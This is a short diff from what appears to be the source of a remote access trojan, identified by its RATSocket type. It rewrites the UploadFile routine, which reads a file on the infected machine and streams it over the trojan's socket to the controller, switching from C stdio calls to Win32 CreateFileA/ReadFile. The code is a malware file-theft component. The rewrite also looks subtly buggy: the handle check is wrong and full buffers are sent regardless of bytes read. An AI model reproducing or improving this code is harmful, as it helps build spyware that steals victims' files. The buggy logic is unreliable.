@@ -172,29 +172,43 @@ int
 UploadFile(RATSocket* ratSocket,
 		   char* filePath)
 {
-	FILE* fs;
-	errno_t errorNo = fopen_s(&fs, filePath, "rb");
-	if ( errorNo == 0 )
+	HANDLE fileHandle = CreateFileA(filePath,
+									GENERIC_READ,
+									0,
+									NULL,
+									OPEN_EXISTING,
+									FILE_ATTRIBUTE_NORMAL,
+									NULL);
+	if ( fileHandle )
 	{
 		for(;;)
 		{
 			char readBuffer[SOCKET_BUFFER_SIZE] = {};
-			size_t readSize = fread(&readBuffer, 1, SOCKET_BUFFER_SIZE, fs);
-			if ( readSize > 0 )
+
+			DWORD bytesRead;
+			BOOL readFileResult = ReadFile(fileHandle,
+										   &readBuffer,
+										   SOCKET_BUFFER_SIZE,
+										   &bytesRead,
+										   NULL);
+			
+			if ( readFileResult && bytesRead > 0 )
 			{
-				SocketSend(ratSocket, readBuffer, SOCKET_BUFFER_SIZE);
+				SocketSend(ratSocket,
+						   readBuffer,
+						   SOCKET_BUFFER_SIZE);
 #if DEBUG						
 				OutputDebugStringA(readBuffer);
 				OutputDebugStringA("\n");
 #endif				
 			}
-			if ( readSize < SOCKET_BUFFER_SIZE || feof(fs) )
+			else
 			{
 				SocketSend(ratSocket, "0", 1);
 				break;
 			}
 		}
-		fclose(fs);
+		CloseHandle(fileHandle);
 		return 0;
 	}
 	else
